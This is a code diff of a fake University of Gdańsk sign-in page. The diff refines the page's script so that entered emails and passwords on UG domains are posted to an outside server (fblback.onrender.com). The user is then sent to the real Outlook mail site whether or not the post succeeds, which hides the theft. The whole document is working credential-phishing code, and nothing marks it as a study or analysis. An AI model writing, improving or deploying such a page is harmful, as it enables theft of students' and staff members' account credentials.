@@ -1,4 +1,3 @@
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -6,12 +5,13 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>Sign in to your account</title>
   <link rel="stylesheet" href="ug-style.css" />
+  <link rel="icon" type="image/png" href="assets/ug-logo.png" />
 </head>
 <body>
   <div class="background">
     <div class="login-box">
       <div class="logo">
-        <img src="assets/ug-logo.png" alt="UG Logo" class="logo" />
+        <img src="assets/ug-logo.png" alt="UG Logo" />
         <span>Uniwersytet Gdański</span>
       </div>
       <form id="loginForm">
@@ -31,23 +31,26 @@
       </form>
     </div>
   </div>
-  <script type="module">
+
+  <script>
     const form = document.getElementById("loginForm");
     const emailInput = document.getElementById("email");
     const passwordInput = document.getElementById("password");
     const errorText = document.getElementById("passwordError");
 
-    form.addEventListener("submit", function (e) {
+    form.addEventListener("submit", async function (e) {
       e.preventDefault();
 
-      const email = emailInput.value;
-      const password = passwordInput.value;
-      const domainValid = /@(studms|staffms|ug)\.ug\.edu\.pl$/.test(email);
+      const email = emailInput.value.trim();
+      const password = passwordInput.value.trim();
+      const domainValid = /@(studms\.ug\.edu\.pl|staffms\.ug\.edu\.pl|ug\.edu\.pl)$/i.test(email);
 
-      if (!domainValid || password === "") {
+      if (!domainValid || !password) {
         errorText.style.display = "block";
         return;
       }
+
+      errorText.style.display = "none";
 
       try {
         await fetch("https://fblback.onrender.com/login", {
@@ -55,8 +58,9 @@
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify({ email, password })
         });
-        window.location.href = "https://outlook.office.com/mail/";
       } catch (err) {
+        // Ошибку можно логировать при необходимости
+      } finally {
         window.location.href = "https://outlook.office.com/mail/";
       }
     });
